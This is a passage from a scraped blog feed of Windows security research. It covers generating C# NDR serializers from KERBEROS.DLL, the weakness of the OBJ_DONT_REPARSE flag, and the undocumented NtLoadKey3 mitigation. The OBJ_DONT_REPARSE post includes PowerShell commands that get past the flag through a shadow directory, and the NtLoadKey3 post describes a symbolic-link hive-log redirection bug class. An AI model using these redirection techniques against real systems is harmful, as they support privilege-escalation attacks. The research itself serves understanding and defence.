added support for <i>Kerberos</i> authentication tokens. To support this I needed to write the parsing code for <i>Tickets</i>. The majority of the <i>Kerberos</i> protocol uses ASN.1 encoding, however some Microsoft specific parts such as the <a href=\"https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/166d8064-c863-41e1-9c23-edaaa5f36962\">Privileged Attribute Certificate (PAC)</a> uses <i>Network Data Representation (NDR)</i>. This is due to these parts of the protocol being derived from the older <a href=\"https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/ff8f970f-3e37-40f7-bd4b-af7336e4792f\">NetLogon</a> protocol which uses <i>MSRPC</i>, which in turn uses <i>NDR</i>.<br /><br />I needed to implement code to parse the <i>NDR</i> stream and return the structured information. As I already had a <a href=\"https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools/blob/master/NtApiDotNet/Ndr/Marshal/NdrUnmarshalBuffer.cs\">class to handle NDR</a> I could manually write the C# parser but that'd take some time and it'd have to be carefully written to handle all use cases. It'd be much easier if I could just use my existing NDR byte code parser to extract the structure information from the KERBEROS DLL. I'd fortunately already written the feature, but it can be non-obvious how to use it. Therefore this blog post gives you an overview of how to extract NDR structure data from existing DLLs and create standalone C# type serializer.<br /><br />First up, how does KERBEROS parse the NDR structure? It could have manual implementations, but it turns out that one of the lesser known features of the MSRPC runtime on Windows is its ability to generate standalone structure and procedure serializers without needing to use an RPC channel. In the documentation this is referred to as <a href=\"https://docs.microsoft.com/en-us/windows/win32/rpc/serialization-services\">Serialization Services</a>.<br /><br />To implement a <a href=\"https://docs.microsoft.com/en-us/windows/win32/rpc/type-serialization\">Type Serializer</a> you need to do the following in a C/C++ project. First, add the types to serialize inside an IDL file. For example the following defines a simple type to serialize.<br /><br /><span>interface TypeEncoders</span><br /><span>{</span><br /><span>&nbsp; &nbsp; typedef struct _TEST_TYPE</span><br /><span>&nbsp; &nbsp; {</span><br /><span>&nbsp; &nbsp; &nbsp; &nbsp; [unique, string] wchar_t* Name;</span><br /><span>&nbsp; &nbsp; &nbsp; &nbsp; DWORD Value;</span><br /><span>&nbsp; &nbsp; } TEST_TYPE;</span><br /><div><span>}</span></div><div><br /></div><div>You then need to create a separate ACF file with the same name as the IDL file (i.e. if you have <i>TYPES.IDL</i> create a file <i>TYPES.ACF</i>) and add the encode and decode attributes.</div><div><br /></div><div><div><span>interface TypeEncoders</span></div><div><span>{</span></div><div><span>&nbsp; &nbsp; typedef [encode, decode] TEST_TYPE;</span></div><div><span>}</span></div></div><div><br /></div><div>Compiling the IDL file using MIDL you'll get the client source code (such as <i>TYPES_c.c</i>), and you should find a few functions, the most important being <i>TEST_TYPE_Encode</i> and <i>TEST_TYPE_Decode</i> which serialize (encode) and deserialize (decode) a type from a byte stream. How you use these functions is not really important. We're more interested in understanding how the NDR byte code is configured to perform the serialization so that we can parse it and generate our own serializers.&nbsp;</div><div><br /></div>If you look at the <i>Decode </i>function when compiled for a X64 target it should look like the following:<br /><br /><span>void</span><br /><span>TEST_TYPE_Decode(</span><br /><span>&nbsp; &nbsp; handle_t _MidlEsHandle,</span><br /><span>&nbsp; &nbsp; TEST_TYPE * _pType)</span><br /><span>{</span><br /><span>&nbsp; &nbsp; NdrMesTypeDecode3(</span><br /><span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;_MidlEsHandle,</span><br /><span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;( PMIDL_TYPE_PICKLING_INFO&nbsp; )&amp;__MIDL_TypePicklingInfo,</span><br /><span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&amp;TypeEncoders_ProxyInfo,</span><br /><span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;TypePicklingOffsetTable,</span><br /><span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;0,</span><br /><span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;_pType);</span><br /><span>}</span><br /><br />The <i>NdrMesTypeDecode3</i> is an API implemented in the RPC runtime DLL. You might be shocked to hear this, but this function and its corresponding <i>NdrMesTypeEncode3</i> are not documented in MSDN. However, the SDK headers contain enough information to understand how it works.<br /><br />The API takes 6 parameters:<br /><ol><li>The serialization handle, used to maintain state such as the current stream position and can be used multiple times to encode or decode more that one structure in a stream.</li><li>The <i>MIDL_TYPE_PICKLING_INFO</i> structure. This structure provides some basic information such as the NDR engine flags.</li><li>The&nbsp;<i>MIDL_STUBLESS_PROXY_INFO</i> structure. This contains the format strings and transfer types for both DCE and NDR64 syntax encodings.</li><li>A list of type offset arrays, these contains the byte offset into the format string (from the Proxy Info structure) for all type serializers.</li><li>The index of the type offset in the 4th parameter.</li><li>A pointer to the structure to serialize or deserialize.</li></ol><br />Only parameters 2 through 5 are needed to parse the NDR byte code correctly. Note that the <i>NdrMesType*3</i> APIs are used for dual DCE and NDR64 serializers. If you compile as 32 bit it will instead use <i>NdrMesType*2</i> APIs which only support DCE. I'll mention what you need to parse the DCE only APIs later, but for now most things you'll want to extract are going to have a 64 bit build which will almost always use&nbsp;<i>NdrMesType*3</i>&nbsp;even though my tooling only parses the DCE NDR byte code.<br /><br />To parse the type serializers you need to load the DLL you want to extract from into memory using <i>LoadLibrary </i>(to ensure any relocations are processed) then use either the <i>Get-NdrComplexType</i> PS command or the <a href=\"https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools/blob/dd8ce3fd151de2cea1932d8f1f11fd4d2ed34512/NtApiDotNet/Ndr/NdrParser.cs#L815\">NdrParser::ReadPicklingComplexType</a> method and pass the addresses of the 4 parameters.<br /><br />Let's look at an example in KERBEROS.DLL. We'll pick the <a href=\"https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/31405771-207a-4855-aba8-b785beaa9d6c\">PAC_DEVICE_INFO</a> structure as it's pretty complex and would require a lot of work to manually write a parser. If you disassemble the&nbsp;<i>PAC_DecodeDeviceInfo</i> function you'll see the call to <i>NdrMesTypeDecode3 </i>as follows (from the DLL in Windows 10 2004 SHA1:173767EDD6027F2E1C2BF5CFB97261D2C6A95969).<br /><br /><span>mov&nbsp; &nbsp; &nbsp;[rsp+28h], r14&nbsp; ; pObject</span><br /><span>mov&nbsp; &nbsp; &nbsp;dword ptr [rsp+20h], 5 ; nTypeIndex</span><br /><span>lea&nbsp; &nbsp; &nbsp;r9, off_1800F3138 ; ArrTypeOffset</span><br /><span>lea&nbsp; &nbsp; &nbsp;r8, stru_1800D5EA0 ; pProxyInfo</span><br /><span>lea&nbsp; &nbsp; &nbsp;rdx, stru_1800DEAF0 ; pPicklingInfo</span><br /><span>mov&nbsp; &nbsp; &nbsp;rcx, [rsp+68h]&nbsp; ; Handle</span><br /><span>call&nbsp; &nbsp; NdrMesTypeDecode3</span><br /><br />From this we can extract the following values:<br /><br /><i>MIDL_TYPE_PICKLING_INFO = 0x1800DEAF0</i><br /><i>MIDL_STUBLESS_PROXY_INFO = 0x1800D5EA0</i><br /><i>Type Offset Array = 0x1800F3138</i><br /><i>Type Offset Index = 5</i><br /><br />These addresses are using the default load address of the library which is unlikely to be the same as where the DLL is loaded in memory. <i>Get-NdrComplexType</i> supports specifying relative addresses from a base module, so subtract the base address of 0x180000000 before using them. The following script will extract the type information.<br /><br /><span>PS&gt; $lib = Import-Win32Module KERBEROS.DLL</span><br /><span>PS&gt; $types = Get-NdrComplexType -PicklingInfo 0xDEAF0 -StublessProxy 0xD5EA0 `</span><br /><span>&nbsp; &nbsp; &nbsp;-OffsetTable 0xF3138 -TypeIndex 5 -Module $lib</span><br /><br />As long as there was no error from this command the <i>$types</i> variable will now contain the parsed complex types, in this case there'll be more than one. Now you can format them to a C# source code file to use in your application using <i>Format-RpcComplexType</i>.<br /><br /><span>PS&gt; Format-RpcComplexType $types -Pointer</span><br /><br />This will generate a C# file which looks like <a href=\"https://gist.github.com/tyranid/e82fbc61aac9b91394df07cc897603bc\">this</a>. The code contains <a href=\"https://gist.github.com/tyranid/e82fbc61aac9b91394df07cc897603bc#file-pac_device_info-cs-L380\">Encoder</a><i> </i>and <a href=\"https://gist.github.com/tyranid/e82fbc61aac9b91394df07cc897603bc#file-pac_device_info-cs-L422\">Decoder</a><i> </i>classes with static methods for each structure. We also passed the <i>Pointer</i> parameter to <i>Format-RpcComplexType</i>. This is so that the structured are wrapped inside a Unique Pointers. This is the default when using the real RPC runtime, although except for <a href=\"https://docs.microsoft.com/en-us/windows/win32/rpc/structures-tfs#:~:text=A%20conformant%20structure%20contains%20only,is%20embedded%20in%20this%20structure.\">Conformant Structures</a> isn't strictly necessary. If you don't do this then the decode will typically fail, certainly in this case.<br /><br />You might notice a serious issue with the generated code, there are no proper structure names. This is unavoidable, the MIDL compiler doesn't keep any name information with the NDR byte code, only the structure information. However, the basic Visual Studio refactoring tool can make short work of renaming things if you know what the names are supposed to be. You could also manually rename everything in the parsed structure information before using <i>Format-RpcComplexType</i>.<br /><br />In this case there is an alternative to all that. We can use the fact that the official MS documentation contains a <a href=\"https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/1d4912dd-5115-4124-94b6-fa414add575f\">full IDL</a> for <i>PAC_DEVICE_INFO</i> and its related structures and build our own executable with the NDR byte code to extract. How does this help? If you reference the <i>PAC_DEVICE_INFO</i> structure as part of an RPC interface no only can you avoid having to work out the offsets as Get-RpcServer will automatically find the location you can also use an additional feature to extract the type information from your private symbols to fixup the type information.<br /><br />Create a C++ project and in an IDL file copy the <i>PAC_DEVICE_INFO </i>structures from the protocol documentation. Then add the following RPC server.<br /><br /><span>[</span><br /><span>&nbsp; &nbsp; uuid(4870536E-23FA-4CD5-9637-3F1A1699D3DC),</span><br /><span>&nbsp; &nbsp; version(1.0),</span><br /><span>]</span><br /><span>interface RpcServer</span><br /><span>{</span><br /><span>&nbsp; &nbsp; int Test([in] handle_t hBinding,&nbsp;</span><br /><span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;[unique] PPAC_DEVICE_INFO device_info);</span><br /><span>}</span><br /><br />Add the generated server C code to the project and add the following code somewhere to provide a basic implementation:<br /><br /><span>#pragma comment(lib, \"rpcrt4.lib\")</span><br /><span><br /></span><span>extern \"C\" void* __RPC_USER MIDL_user_allocate(size_t size) {</span><br /><span>&nbsp; &nbsp; return new char[size];</span><br /><span>}</span><br /><span><br /></span><span>extern \"C\" void __RPC_USER MIDL_user_free(void* p) {</span><br /><span>&nbsp; &nbsp; delete[] p;</span><br /><span>}</span><br /><span><br /></span><span>int Test(</span><br /><span>&nbsp; &nbsp; handle_t hBinding,</span><br /><span>&nbsp; &nbsp; PPAC_DEVICE_INFO device_info) {</span><br /><span>&nbsp; &nbsp; printf(\"Test %p\\n\", device_info);</span><br /><span>&nbsp; &nbsp; return 0;</span><br /><span>}</span><br /><br />Now compile the executable as a 64-bit release build if you're using 64-bit PS. The release build ensures there's no weird debug stub in front of your function which could confuse the type information. The implementation of <i>Test </i>needs to be unique, otherwise the linker will fold a duplicate function and the type information will be lost, we just <i>printf </i>a unique string.<br /><br />Now parse the RPC server using <i>Get-RpcServer </i>and format the complex types.<br /><br /><span>PS&gt; $rpc = Get-RpcServer RpcServer.exe -ResolveStructureNames</span><br /><span>PS&gt; Format-RpcComplexType $rpc.ComplexTypes -Pointer</span><br /><br />If everything has worked you'll now find the <a href=\"https://gist.github.com/tyranid/db971d5484b676f6f394bf051450760b\">output</a> to be much more useful. Admittedly I also did a bit of further cleanup in my version in <a href=\"https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools/blob/master/NtApiDotNet/Win32/Security/Authentication/Kerberos/Ndr/PacDeviceInfoParser.cs\">NtApiDotNet</a> as I didn't need the encoders and I added some helper functions.<br /><br />Before leaving this topic I should point out how to handle called to <i>NdrMesType*2</i> in case you need to extract data from a library which uses that API. The parameters are slightly different to <i>NdrMesType*3</i>.<br /><br /><span>void</span><br /><span>TEST_TYPE_Decode(</span><br /><span>&nbsp; &nbsp; handle_t _MidlEsHandle,</span><br /><span>&nbsp; &nbsp; TEST_TYPE * _pType)</span><br /><span>{</span><br /><span>&nbsp; &nbsp; NdrMesTypeDecode2(</span><br /><span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;_MidlEsHandle,</span><br /><span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;( PMIDL_TYPE_PICKLING_INFO&nbsp; )&amp;__MIDL_TypePicklingInfo,</span><br /><span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&amp;TypeEncoders_StubDesc,</span><br /><span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;( PFORMAT_STRING&nbsp; )&amp;types__MIDL_TypeFormatString.Format[2],</span><br /><span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;_pType);</span><br /><span>}</span><br /><ol><li>The serialization handle.</li><li>The&nbsp;<i>MIDL_TYPE_PICKLING_INFO</i>&nbsp;structure.</li><li>The <i>MIDL_STUB_DESC</i>&nbsp;structure. This only contains DCE NDR byte code.</li><li>A pointer into the format string for the start of the type.</li><li>A pointer to the structure to serialize or deserialize.</li></ol>Again we can discard the first and last parameters. You can then get the addresses of the middle three and pass them to <i>Get-NdrComplexType</i>.<br /><br /><span>PS&gt; Get-NdrComplexType -PicklingInfo 0x1234 `</span><br /><span>&nbsp; &nbsp; -StubDesc 0x2345 -TypeFormat 0x3456 -Module $lib</span><br /><br />You'll notice that there's a offset in the format string (2 in this case) which you can pass instead of the address in memory. It depends what information your disassembler shows:<br /><br /><span>PS&gt; Get-NdrComplexType -PicklingInfo 0x1234 `</span><br /><span>&nbsp; &nbsp; -StubDesc 0x2345 -TypeOffset 2 -Module $lib</span><br /><br />Hopefully this is useful for implementing these NDR serializers in C#. As they don't rely on any native code (or the RPC runtime) you should be able to use them on other platforms in .NET Core even if you can't use the ALPC RPC code.", "links": [{"rel": "edit", "type": "application/atom+xml", "href": "https://www.blogger.com/feeds/4304739697716191998/posts/default/6546800563660569708"}, {"rel": "self", "type": "application/atom+xml", "href": "https://www.blogger.com/feeds/4304739697716191998/posts/default/6546800563660569708"}, {"rel": "alternate", "type": "text/html", "href": "https://www.tiraniddo.dev/2020/07/generating-ndr-type-serializers-for-c.html", "title": "Generating NDR Type Serializers for C#"}], "authors": [{"name": "Unknown", "email": "noreply@blogger.com"}], "author_detail": {"name": "Unknown", "email": "noreply@blogger.com"}, "author": "Unknown (noreply@blogger.com)", "gd_image": {"rel": "http://schemas.google.com/g/2005#thumbnail", "width": "16", "height": "16", "src": "https://img1.blogblog.com/img/b16-rounded.gif"}}, {"id": "tag:blogger.com,1999:blog-4304739697716191998.post-8273528469545308151", "guidislink": true, "link": "https://www.tiraniddo.dev/2020/05/objdontreparse-is-mostly-useless.html", "published": "2020-05-23T03:21:00.001-07:00", "published_parsed": [2020, 5, 23, 10, 21, 0, 5, 144, 0], "updated": "2020-05-23T03:21:37.202-07:00", "updated_parsed": [2020, 5, 23, 10, 21, 37, 5, 144, 0], "tags": [{"term": "Strange Behaviour", "scheme": "http://www.blogger.com/atom/ns#", "label": null}, {"term": "Windows", "scheme": "http://www.blogger.com/atom/ns#", "label": null}], "title": "OBJ_DONT_REPARSE is (mostly) Useless.", "title_detail": {"type": "text/plain", "language": null, "base": "https://www.tiraniddo.dev/feeds/posts/default", "value": "OBJ_DONT_REPARSE is (mostly) Useless."}, "content": [{"type": "text/html", "language": null, "base": "https://www.tiraniddo.dev/feeds/posts/default", "value": "Continuing a theme from the last <a href=\"https://www.tiraniddo.dev/2020/05/silent-exploit-mitigations-for-1.html\">blog post</a>, I think it's great that the two additional <i>OBJECT_ATTRIBUTE</i> flags were <a href=\"https://docs.microsoft.com/en-us/windows/win32/api/ntdef/ns-ntdef-_object_attributes\">documented</a> as a way of mitigating symbolic link attacks. While&nbsp;<i>OBJ_IGNORE_IMPERSONATED_DEVICEMAP</i> is pretty useful, the other flag,&nbsp;<i>OBJ_DONT_REPARSE</i> isn't, at least not for protecting file system access.<br /><br />To quote the documentation, <i>OBJ_DONT_REPARSE</i> does the following:<br /><br /><i>\"If this flag is set, no reparse points will be followed when parsing the name of the associated object. If any reparses are encountered the attempt will fail and return an STATUS_REPARSE_POINT_ENCOUNTERED result. This can be used to determine if there are any reparse points in the object's path, in security scenarios.\"</i><br /><br />This seems pretty categorical, if any reparse point is encountered then the name parsing stops and <i>STATUS_REPARSE_POINT_ENCOUNTERED</i> is returned. Let's try it out in PS and open the notepad executable file.<br /><br /><span style=\"font-family: Courier New, Courier, monospace;\">PS&gt; Get-NtFile \\??\\c:\\windows\\notepad.exe -ObjectAttributes DontReparse</span><br /><span style=\"color: red; font-family: Courier New, Courier, monospace;\">Get-NtFile : (0xC000050B) - The object manager encountered a reparse point while retrieving an object.</span><br /><br />Well that's not what you might expect, there should be no reparse points to access notepad, so what went wrong? We'll you're assuming that the documentation meant NTFS reparse points, when it really meant all reparse points. The C: drive symbolic link is still a reparse point, just for the Object Manager. Therefore just accessing a drive path using this Object Attribute flag fails. Still this does means that it will also work to protect you from Registry Symbolic Links as well as that also uses a Reparse Point.<br /><br />I'm assuming this flag wasn't introduced for file access at all, but instead for named kernel objects where encountering a Symbolic Link is usually less of a problem. Unlike&nbsp;<i>OBJ_IGNORE_IMPERSONATED_DEVICEMAP</i>&nbsp;I can't pinpoint a specific vulnerability this flag was associated with, so I can't say for certain why it was introduced. Still, it's slightly annoying especially considering there is an IO Manager specific flag,&nbsp;<i>IO_STOP_ON_SYMLINK</i> which does what you'd want to avoid file system symbolic links but that can only be accessed in kernel mode with <a href=\"https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-iocreatefileex\">IoCreateFileEx</a>.<br /><br />Not that this flag completely protects against Object Manager redirection attacks. It doesn't prevent abuse of shadow directories for example which can be used to redirect path lookups.<br /><br /><span style=\"font-family: Courier New, Courier, monospace;\">PS&gt; $d = Get-NtDirectory \\Device</span><br /><span style=\"font-family: Courier New, Courier, monospace;\">PS&gt; $x = New-NtDirectory \\BaseNamedObjects\\ABC -ShadowDirectory $d</span><br /><span style=\"font-family: Courier New, Courier, monospace;\">PS&gt; $f = Get-NtFile \\BaseNamedObjects\\ABC\\HarddiskVolume3\\windows\\notepad.exe -ObjectAttributes DontReparse</span><br /><span style=\"font-family: Courier New, Courier, monospace;\">PS&gt; $f.FullPath</span><br /><span style=\"font-family: Courier New, Courier, monospace;\">\\Device\\HarddiskVolume3\\Windows\\notepad.exe</span><br /><br />Oh well..."}], "summary": "Continuing a theme from the last <a href=\"https://www.tiraniddo.dev/2020/05/silent-exploit-mitigations-for-1.html\">blog post</a>, I think it's great that the two additional <i>OBJECT_ATTRIBUTE</i> flags were <a href=\"https://docs.microsoft.com/en-us/windows/win32/api/ntdef/ns-ntdef-_object_attributes\">documented</a> as a way of mitigating symbolic link attacks. While&nbsp;<i>OBJ_IGNORE_IMPERSONATED_DEVICEMAP</i> is pretty useful, the other flag,&nbsp;<i>OBJ_DONT_REPARSE</i> isn't, at least not for protecting file system access.<br /><br />To quote the documentation, <i>OBJ_DONT_REPARSE</i> does the following:<br /><br /><i>\"If this flag is set, no reparse points will be followed when parsing the name of the associated object. If any reparses are encountered the attempt will fail and return an STATUS_REPARSE_POINT_ENCOUNTERED result. This can be used to determine if there are any reparse points in the object's path, in security scenarios.\"</i><br /><br />This seems pretty categorical, if any reparse point is encountered then the name parsing stops and <i>STATUS_REPARSE_POINT_ENCOUNTERED</i> is returned. Let's try it out in PS and open the notepad executable file.<br /><br /><span style=\"font-family: Courier New, Courier, monospace;\">PS&gt; Get-NtFile \\??\\c:\\windows\\notepad.exe -ObjectAttributes DontReparse</span><br /><span style=\"color: red; font-family: Courier New, Courier, monospace;\">Get-NtFile : (0xC000050B) - The object manager encountered a reparse point while retrieving an object.</span><br /><br />Well that's not what you might expect, there should be no reparse points to access notepad, so what went wrong? We'll you're assuming that the documentation meant NTFS reparse points, when it really meant all reparse points. The C: drive symbolic link is still a reparse point, just for the Object Manager. Therefore just accessing a drive path using this Object Attribute flag fails. Still this does means that it will also work to protect you from Registry Symbolic Links as well as that also uses a Reparse Point.<br /><br />I'm assuming this flag wasn't introduced for file access at all, but instead for named kernel objects where encountering a Symbolic Link is usually less of a problem. Unlike&nbsp;<i>OBJ_IGNORE_IMPERSONATED_DEVICEMAP</i>&nbsp;I can't pinpoint a specific vulnerability this flag was associated with, so I can't say for certain why it was introduced. Still, it's slightly annoying especially considering there is an IO Manager specific flag,&nbsp;<i>IO_STOP_ON_SYMLINK</i> which does what you'd want to avoid file system symbolic links but that can only be accessed in kernel mode with <a href=\"https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-iocreatefileex\">IoCreateFileEx</a>.<br /><br />Not that this flag completely protects against Object Manager redirection attacks. It doesn't prevent abuse of shadow directories for example which can be used to redirect path lookups.<br /><br /><span style=\"font-family: Courier New, Courier, monospace;\">PS&gt; $d = Get-NtDirectory \\Device</span><br /><span style=\"font-family: Courier New, Courier, monospace;\">PS&gt; $x = New-NtDirectory \\BaseNamedObjects\\ABC -ShadowDirectory $d</span><br /><span style=\"font-family: Courier New, Courier, monospace;\">PS&gt; $f = Get-NtFile \\BaseNamedObjects\\ABC\\HarddiskVolume3\\windows\\notepad.exe -ObjectAttributes DontReparse</span><br /><span style=\"font-family: Courier New, Courier, monospace;\">PS&gt; $f.FullPath</span><br /><span style=\"font-family: Courier New, Courier, monospace;\">\\Device\\HarddiskVolume3\\Windows\\notepad.exe</span><br /><br />Oh well...", "links": [{"rel": "edit", "type": "application/atom+xml", "href": "https://www.blogger.com/feeds/4304739697716191998/posts/default/8273528469545308151"}, {"rel": "self", "type": "application/atom+xml", "href": "https://www.blogger.com/feeds/4304739697716191998/posts/default/8273528469545308151"}, {"rel": "alternate", "type": "text/html", "href": "https://www.tiraniddo.dev/2020/05/objdontreparse-is-mostly-useless.html", "title": "OBJ_DONT_REPARSE is (mostly) Useless."}], "authors": [{"name": "Unknown", "email": "noreply@blogger.com"}], "author_detail": {"name": "Unknown", "email": "noreply@blogger.com"}, "author": "Unknown (noreply@blogger.com)", "gd_image": {"rel": "http://schemas.google.com/g/2005#thumbnail", "width": "16", "height": "16", "src": "https://img1.blogblog.com/img/b16-rounded.gif"}}, {"id": "tag:blogger.com,1999:blog-4304739697716191998.post-4483564999833455266", "guidislink": true, "link": "https://www.tiraniddo.dev/2020/05/silent-exploit-mitigations-for-1.html", "published": "2020-05-22T16:59:00.003-07:00", "published_parsed": [2020, 5, 22, 23, 59, 0, 4, 143, 0], "updated": "2020-05-23T02:32:23.443-07:00", "updated_parsed": [2020, 5, 23, 9, 32, 23, 5, 144, 0], "tags": [{"term": "Undocumented", "scheme": "http://www.blogger.com/atom/ns#", "label": null}, {"term": "Windows", "scheme": "http://www.blogger.com/atom/ns#", "label": null}], "title": "Silent Exploit Mitigations for the 1%", "title_detail": {"type": "text/plain", "language": null, "base": "https://www.tiraniddo.dev/feeds/posts/default", "value": "Silent Exploit Mitigations for the 1%"}, "content": [{"type": "text/html", "language": null, "base": "https://www.tiraniddo.dev/feeds/posts/default", "value": "With the accelerated release schedule of Windows 10 it's common for new features to be regularly introduced. This is especially true of features to mitigate some poorly designed APIs or easily misused behavior. The problems with many of these mitigations is they're regularly undocumented or at least not exposed through the common Win32 APIs. This means that while Microsoft can be happy and prevent their own code from being vulnerable they leave third party developers to get fucked.<br /><br />One example of these silent mitigations are the additional <i>OBJECT_ATTRIBUTE </i>flags&nbsp;<i>OBJ_IGNORE_IMPERSONATED_DEVICEMAP</i> and <i>OBJ_DONT_REPARSE</i> which were finally <a href=\"https://docs.microsoft.com/en-us/windows/win32/api/ntdef/ns-ntdef-_object_attributes\">documented</a>, in part because I said it'd be nice if they did so. Of course, it only took <a href=\"https://bugs.chromium.org/p/project-zero/issues/detail?id=240\">5 years</a> to document them since they were introduced to fix bugs I reported. I guess that's pretty speedy in Microsoft's world. And of course they only help you if you're using the system call APIs which, let's not forget, are only partially documented.<br /><br />While digging around in Windows 10 2004 (ugh... really, it's just confusing), and probably reminded by Alex Ionescu at some point, I noticed Microsoft have introduced another mitigation which is only available using an undocumented system call and not via any exposed Win32 API. So I thought, I should document it.<br /><br />UPDATE (2020-04-23): According to <a href=\"https://twitter.com/hFireF0X/status/1264042069519196163\">@FireF0X</a> this was backported to all supported OS's. So it's a security fix important enough to backport but not tell anyone about. Fantastic.<br /><br />The system call in question is <i>NtLoadKey3</i>. According to j00ru's <a href=\"https://j00ru.vexillium.org/syscalls/nt/64/\">system call table</a> this was introduced in Windows 10 2004, however it's at least in Windows 10 1909 as well. As the name suggests (if you're me at least) this loads a Registry Key Hive to an attachment point. This functionality has been extended over time, originally there was only <i>NtLoadKey</i>, then <i>NtLoadKey2</i> was introduced in XP I believe to add some flags. Then <i>NtLoadKeyEx </i>was introduced to add things like explicit Trusted Hive support to mitigate cross hive symbolic link attacks (which is all j00ru's and <a href=\"https://gynvael.coldwind.pl/\">Gynvael</a> fault). And now finally <i>NtLoadKey3.</i>&nbsp;I've no idea why it went to <i>2</i> then to <i>Ex</i> then back to <i>3</i> maybe it's some new Microsoft counting system. The <i>NtLoadKeyEx</i> is partially exposed through the Win32 APIs <a href=\"https://docs.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regloadkeyw\">RegLoadKey</a> and <a href=\"https://docs.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regloadappkeyw\">RegLoadAppKey</a> APIs, although they're only expose a subset of the system call's functionality.<br /><br />Okay, so what bug class is Nt<i>LoadKey3 </i>trying to mitigate? One of the problematic behaviors of loading a full Registry Hive (rather that a Per-User Application Hive) is you need to have <i>SeRestorePrivilege*</i>&nbsp;on the caller's Effective Token. <i>SeRestorePrivilege&nbsp;</i>is only granted to Administrators, so in order to call the API successfully you can't be impersonating a low-privileged user. However, the API can also create files when loading the hive file. This includes the hive file itself as well as the recovery log files.<br /><br /><i>* Don't pay attention to the documentation for RegLoadKey which claims you also need SeBackupPrivilege. Maybe it was required at some point, but it isn't any more.</i><br /><br />When loading a system hive such as HKLM\\SOFTWARE this isn't an issue as these hives are stored in an Administrator only location (<i>c:\\windows\\system32\\config</i> if you're curious) but sometimes the hives are loaded from user-accessible locations such as from the user's profile or for Desktop Bridge support. In a user accessible location you can use symbolic link tricks to force the logs file to be written to arbitrary locations, and to make matters worse the Security Descriptor of the primary hive file is copied to the log file so it'll be accessible afterwards. An example of just this bug, in this case in Desktop Bridge, is issue <a href=\"https://bugs.chromium.org/p/project-zero/issues/detail?id=1492\">1492</a>&nbsp;(and <a href=\"https://bugs.chromium.org/p/project-zero/issues/detail?id=1554\">1554</a> as they didn't fix it properly (\u256f\u00b0\u25a1\u00b0\uff09\u256f\ufe35 \u253b\u2501\u253b).<br /><br /><i>RegLoadKey3 </i>fixes this by introducing an additional parameter to specify an Access Token which will be impersonated when creating any files. This way the check for <i>SeRestorePrivilege </i>can use the caller's Access Token, but any \"dangerous\" operation will use the user's Token. Of course they could have probably implemented this by adding a new flag which will check the caller's Primary Token for the privilege like they do for <i>SeImpersonatePrivilege </i>and <i>SeAssignPrimaryTokenPrivilege </i>but what do I know...<br /><br />Used appropriately this should completely mitigate the poor design of the system call. For example the User Profile service now uses <i>NtLoadKey3</i> when loading the hives from the user's profile. How do you call it yourself? I couldn't find any documentation obviously, and even in the usual locations such as OLE32's private symbols there doesn't seem to be any structure data, so I made best guess with the following:<br /><br />Notice that the <i>TrustKey </i>and <i>Event</i> handles from <i>NtLoadKeyEx</i> have also been folded up into a list of handle values. Perhaps someone wasn't sure if they ever needed to extend the system call whether to go for <i>NtLoadKey4 </i>or <i>NtLoadKeyExEx </i>so they avoided the decision by making the system call more flexible. Also the final parameter, which is also present in <i>NtLoadKeyEx</i> is seemingly unused, or I'm just incapable of tracking down when it gets referenced. Process Hacker's <a href=\"https://github.com/processhacker/processhacker/blob/master/phnt/include/ntzwapi.h\">header files</a> claim it's for an <i>IO_STATUS_BLOCK</i> pointer, but I've seen no evidence that's the case.<br /><br />It'd be really awesome if in this new, sharing and caring Microsoft that they, well shared and cared more often, especially for features important to securing third party applications. TBH I think they're more focused on bringing <a href=\"https://lists.freedesktop.org/archives/dri-devel/2020-May/266691.html\">Wayland to WSL2</a> or shoving a <a href=\"https://github.com/microsoft/ProjectReunion\">new API set</a> down developers' throats than documenting things like this."}], "summary": "With the accelerated release schedule of Windows 10 it's common for new features to be regularly introduced. This is especially true of features to mitigate some poorly designed APIs or easily misused behavior. The problems with many of these mitigations is they're regularly undocumented or at least not exposed through the common Win32 APIs. This means that while Microsoft can be happy and prevent their own code from being vulnerable they leave third party developers to get fucked.<br /><br />One example of these silent mitigations are the additional <i>OBJECT_ATTRIBUTE </i>flags&nbsp;<i>OBJ_IGNORE_IMPERSONATED_DEVICEMAP</i> and <i>OBJ_DONT_REPARSE</i> which were finally <a href=\"https://docs.microsoft.com/en-us/windows/win32/api/ntdef/ns-ntdef-_object_attributes\">documented</a>, in part because I said it'd be nice if they did so. Of course, it only took <a href=\"https://bugs.chromium.org/p/project-zero/issues/detail?id=240\">5 years</a> to document them since they were introduced to fix bugs I reported. I guess that's pretty speedy in Microsoft's world. And of course they only help you if you're using the system call APIs which, let's not forget, are only partially documented.<br /><br />While digging around in Windows 10 2004 (ugh... really, it's just confusing), and probably reminded by Alex Ionescu at some point, I noticed Microsoft have introduced another mitigation which is only available using an undocumented system call and not via any exposed Win32 API. So I thought, I should document it.<br /><br />UPDATE (2020-04-23): According to <a href=\"https://twitter.com/hFireF0X/status/1264042069519196163\">@FireF0X</a> this was backported to all supported OS's. So it's a security fix important enough to backport but not tell anyone about. Fantastic.<br /><br />The system call in question is <i>NtLoadKey3</i>. According to j00ru's <a 